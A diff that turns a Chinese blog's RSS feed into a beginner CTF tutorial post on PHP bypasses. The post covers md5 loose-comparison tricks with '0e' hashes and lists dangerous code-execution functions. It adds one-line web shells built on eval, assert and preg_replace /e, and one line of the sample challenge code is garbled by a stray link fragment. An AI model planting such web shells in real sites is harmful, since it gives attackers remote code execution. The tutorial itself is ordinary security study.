@@ -1,26 +1,25 @@
-<?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>C137_backer 的博客</title><link>https://C137-backer.github.io/C137backer.github.io</link><description>在乎你在乎的人怎么在乎你，别在乎你不在乎的人怎么在乎你。</description><copyright>C137_backer 的博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/207218297?v=4</url><title>avatar</title><link>https://C137-backer.github.io/C137backer.github.io</link></image><lastBuildDate>Mon, 14 Apr 2025 17:59:51 +0000</lastBuildDate><managingEditor>C137_backer 的博客</managingEditor><ttl>60</ttl><webMaster>C137_backer 的博客</webMaster><item><title>php的基础和普通的一些绕过</title><link>https://C137-backer.github.io/C137backer.github.io/post/php-de-ji-chu-he-pu-tong-de-yi-xie-rao-guo.html</link><description>## 新生第一步，认识md5（five）
+## 新生第一步，认识md5（five）
 例题：
 ```php
-&lt;?php 
+<?php 
  highlight_file(__FILE__);
  include 'flag2.php';
  
-if (isset($_GET['name']) &amp;&amp; isset($_POST['password'])){
+if (isset($_GET['name']) && isset($_POST['password'])){
     $name = $_GET['name'];
     $password = [$_POST['password'];](url)
-    if ($name != $password &amp;&amp; md5($name) == md5($password)){
+    if ($name != $password && md5($name) == md5($password)){
         echo $flag;
     }
     else {
-        echo 'wrong!';
+        echo "wrong!";
     }
  
 }
 else {
     echo 'wrong!';
 }
-?&gt; 
+?> 
 ```
 如例题所示，要求传入的是两个参数，post一个password，get一个name,要求两个东西的参数内容不一样，但是md5的值要一样，看似是不可能的，但是，md5其实早已被前人们给创烂了，md5的对撞已经不是很难完成，但是，这里用的并不是md5的对撞，而是php语言的妙妙小特性：
 在md5化之后，如果数据以0e加纯数字结尾，会被直接解析为0，以此达到相等的结果,这里贴出一些值:
@@ -85,4 +84,28 @@ popen()
 ###1、代码执行系
 这些函数能够执行一些php的代码，造成危险，同时是flag的获取点
 #### eval()
-大名鼎鼎，臭名昭著。</description><guid isPermaLink="true">https://C137-backer.github.io/C137backer.github.io/post/php-de-ji-chu-he-pu-tong-de-yi-xie-rao-guo.html</guid><pubDate>Mon, 14 Apr 2025 15:09:35 +0000</pubDate></item><item><title>F12</title><link>https://C137-backer.github.io/C137backer.github.io/post/F12.html</link><description>##### 年轻的勇者，按F12打开你的浏览器开发者工具，恭喜你，踏出了成为web狗的第一步。</description><guid isPermaLink="true">https://C137-backer.github.io/C137backer.github.io/post/F12.html</guid><pubDate>Mon, 14 Apr 2025 11:08:21 +0000</pubDate></item><item><title>http协议</title><link>https://C137-backer.github.io/C137backer.github.io/post/http-xie-yi.html</link><description>##### 没啥好说的，之前没博客，没收拾知识点，现在来返工了。</description><guid isPermaLink="true">https://C137-backer.github.io/C137backer.github.io/post/http-xie-yi.html</guid><pubDate>Sun, 13 Apr 2025 13:57:21 +0000</pubDate></item></channel></rss>
+大名鼎鼎，臭名昭著。一句话木马常客一号。
+```php
+<?php @eval($_POST['shell']);?>
+```
+#### assert()
+同样是很敏感的东西，一句话木马常客二号
+```php
+<?php assert(@$_POST['shell']); ?>
+```
+#### preg_replace()
+这个不太常用，当匹配模式/e时，该函数会将$replacement作为php代码执行
+贴一份对应一句话木马
+```php
+preg_replace("/test/e",$_GET["shell"],"just test");
+```
+剩下几个使用范围较少，有的甚至已经被弃用了，这里就不做介绍了：
+create_function()  (**在php7.2.0后被废弃**)
+array_map()
+call_user_func()
+call_user_func_array()
+array_filter()
+
+### 2、命令执行系
+
+###### 今天的博客先写到这里吧QWQ
